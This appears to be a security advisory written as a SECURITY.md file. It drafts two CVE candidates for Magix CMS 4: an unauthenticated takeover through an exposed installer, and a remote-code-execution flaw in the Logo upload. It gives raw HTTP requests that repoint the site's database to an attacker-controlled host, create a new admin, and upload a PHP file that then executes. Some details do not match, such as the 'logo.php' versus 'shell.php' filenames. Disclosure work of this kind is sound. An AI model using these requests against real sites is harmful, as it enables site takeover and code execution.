# Security Policy

## CVE Candidate A

### Proposed title

Magix CMS 4 allows unauthenticated reinstallation and administrator takeover through an exposed installer

### One-line CVE description draft

Magix CMS 4  keeps the installation workflow reachable after deployment, allowing an unauthenticated attacker to overwrite the database configuration and re-run the final setup step to create a new administrator account and take over the site.

### Longer advisory description

In Magix CMS 4 ,the installer entry point does not stop processing after detecting that the application is already configured. An unauthenticated remote attacker can still access `install/index.php`, invoke the database configuration step, overwrite `app/init/config.php` with attacker-controlled database settings, and then invoke the final setup step to initialize a new administrator account in that database. This leads to full administrative takeover of the CMS and can be chained with other authenticated backend vulnerabilities.

### Attack prerequisites

- Remote network access to the web application
- The `/install/` path remains deployed and reachable
- No prior credentials required

### Impact

- Unauthorized overwrite of database connection settings
- Attacker-controlled reinitialization of the site
- Creation of a new privileged administrator
- Full backend takeover

### Key evidence

- installer keeps running even if config exists: `install/index.php#L11-L14`,` install/index.php#L45-L65`
- unauthenticated database save path: `DatabaseController.php#L21-L39, `DatabaseController.php#L90-L127`
- final installation step creates admin and resets core tables: `FinalizeController.php#L29-L60`, `FinalizeController.php#L66-L138`

### Reproduction summary for vendor/CNA

1. Request `/install/index.php?step=2` on an already installed instance.
2. Submit the database save action to replace the production database settings in `app/init/config.php`.
3. Submit the final installation step to initialize attacker-controlled site metadata and a new administrator account.
4. Log in with the attacker-created administrator and confirm full backend access.

### Attack Process 

I have set up a server and configured the following required environment as follows: 

1. Serveur web (Apache/Nginx)
2. PHP 8.2+ 3. Extension PHP GD (ou Imagick), PHP curl, PHP mbstring, PHP pdo_mysql
3. MySQL / MariaDB

It has been successfully deployed. You can see that we have logged in as the admin user. This is the server's backend. The local IP address is 192.168.117.156.
<img width="1910" height="780" alt="image" src="https://github.com/user-attachments/assets/ae2c500e-156a-4b82-af9d-8d0f7cd467ec" />

Access to the attack end: http://{IP}/install/index.php? step=2

We can call upon the database of an external server to reset the database of this server.Here it is 192.168.117.128

#### Raw request

```http
GET /install/index.php?step=2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Accept: text/html,*/*
Connection: close
```

<img width="1545" height="961" alt="image" src="https://github.com/user-attachments/assets/66fc0d51-093c-426e-8198-fa3ad48cdf2f" />
#### Raw request

```http
POST /install/index.php?step=2 HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: close

action=save&db_host=192.168.117.128&db_name=test&db_user=dbuser&db_pass=your_password
```

#### Expected response

Based on the server code path, success returns JSON similar to:

```json
{"success":true,"message":"Configuration générée avec succès."}
```

------

#### Raw request

```http
POST /install/index.php?step=4 HTTP/1.1
Host: www.magixcms4.test
Content-Type: application/x-www-form-urlencoded
Connection: close

site_name=super&url_domain=192.168.117.156&admin_firstname=test&admin_lastname=test&admin_email=test@test.com&admin_password=12345678&admin_password_conf=12345678
```

#### Expected result

- installation finalization succeeds
- a new administrator account is inserted into the attacker-chosen database
- backend login becomes possible with the submitted credentials
<img width="1297" height="886" alt="image" src="https://github.com/user-attachments/assets/f7d0bd62-cb91-4fcd-a4cd-248509903981" />
The account has been reset to `test` and the password is `12345678`.
<img width="1109" height="846" alt="image" src="https://github.com/user-attachments/assets/460ef899-abe0-484c-b3aa-8d248b9ade4a" />

Or you can log in by visiting http://{IP}/admin/index.php?controller=Login
<img width="1328" height="866" alt="image" src="https://github.com/user-attachments/assets/3051f2f7-04af-4a66-967b-56f81647e591" />

<img width="1913" height="863" alt="image" src="https://github.com/user-attachments/assets/90b6a4c9-66c5-4521-a7ba-477c8b05f7df" />

### Suggested remediation wording

- hard block all installer routes after successful installation
- require a one-time installation lock or installation token
- refuse access to `step=2` and `step=4` when `app/init/config.php` already exists
- remove or deny `/install/` in production deployments

## CVE Candidate B

### Proposed title

Magix CMS 4 Logo upload permits authenticated dangerous file upload and remote code execution

### One-line CVE description draft

Magix CMS 4 allows a backend user to upload a file with a dangerous extension through the Logo upload feature because the original extension is preserved, the file is written before image validation, and failed validation does not remove the uploaded file.

### Longer advisory description

In Magix CMS 4 , the backend Logo upload flow derives the final filename from the user-controlled original extension, writes the file into the web-accessible `/img/logo/` directory with `move_uploaded_file()`, and only then attempts to process the file as an image. If image parsing fails, the error is returned but the uploaded file is not deleted. An authenticated attacker can therefore upload a `.php` file, trigger an application-level upload error, and still execute the file over HTTP, leading to remote code execution.



### Important note on chain severity

Even if Candidate B is scored as authenticated-only, the validated attack chain shows that Candidate A can supply the required backend access. The combined real-world chain is therefore effectively critical.

### Attack prerequisites

- Valid backend session with access to the Logo module upload action
- Web server executes `.php` files from `/img/logo/`

### Impact

- Upload of a PHP web shell or server-side script
- Direct HTTP-triggered code execution
- Possible credential theft, persistence, and full server compromise

### Key evidence

- upload action passes user-derived filename to the uploader: `LogoController.php#L83-L115`
- filename generation preserves original extension: `LogoController.php#L53-L80`
- upload helper preserves original extension and writes first: `UploadTool.php#L117-L159`
- validation happens after the file is already on disk: `UploadTool.php#L146-L159`, `UploadTool.php#L164-L220`

### Reproduction summary for vendor/CNA

1. Authenticate to the backend.
2. Upload a `.php` file via the Logo upload endpoint.
3. Observe that the application returns an image-decoding error.
4. Confirm that the uploaded `.php` file still exists under `/img/logo/`.
5. Request the uploaded file over HTTP and confirm server-side execution.

### Attack steps

Visit http://{IP}/admin/index.php? controller=Logo
<img width="1906" height="938" alt="image" src="https://github.com/user-attachments/assets/1f63bf19-c38c-470a-8157-4e502fa52f99" />
You can directly upload the PHP file. The content is as follows:

```
<?php echo "Has already been attacked!";?>
```
<img width="1920" height="928" alt="image" src="https://github.com/user-attachments/assets/f497d980-1289-490b-bb94-4d0643a56053" />
#### Raw request

Boundary is illustrative; any valid multipart boundary may be used.

```http
POST /admin/index.php?controller=Logo&action=upload HTTP/1.1
Host: www.magixcms4.test
Cookie: PHPSESSID=<valid_session_cookie>
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----MAGIXBOUNDARY
Connection: close

------MAGIXBOUNDARY
Content-Disposition: form-data; name="hashtoken"

<valid_token>
------MAGIXBOUNDARY
Content-Disposition: form-data; name="filename"

shell
------MAGIXBOUNDARY
Content-Disposition: form-data; name="logo_file"; filename="magix_logo_shell.php"
Content-Type: application/octet-stream

<?php echo "Has already been attacked!";?>
------MAGIXBOUNDARY--
```

The front-end upload failed, but on the server side, the file can be found in the "img/logo" folder and it has been renamed as "logo.php".
<img width="759" height="478" alt="image" src="https://github.com/user-attachments/assets/5309998b-00bc-4315-a1c4-e395fd2d1c36" />
Visit http://{IP}/img/logo/logo.php

#### Raw request

```http
GET /img/logo/shell.php HTTP/1.1
Host: 
Connection: close
```

#### Observed response body

```text
Has already been attacked!
```
<img width="1064" height="527" alt="image" src="https://github.com/user-attachments/assets/9e2b6fa9-3f0b-46fa-b971-92c78c1903b1" />
### Suggested remediation wording

- allow only a strict server-side extension whitelist such as `jpg`, `jpeg`, `png`, `webp`
- do not trust the original uploaded extension
- validate MIME type and image contents before final write
- delete the uploaded file immediately on any post-write processing failure
- move upload directories outside the web root
- deny script execution in upload directories at the web server layer


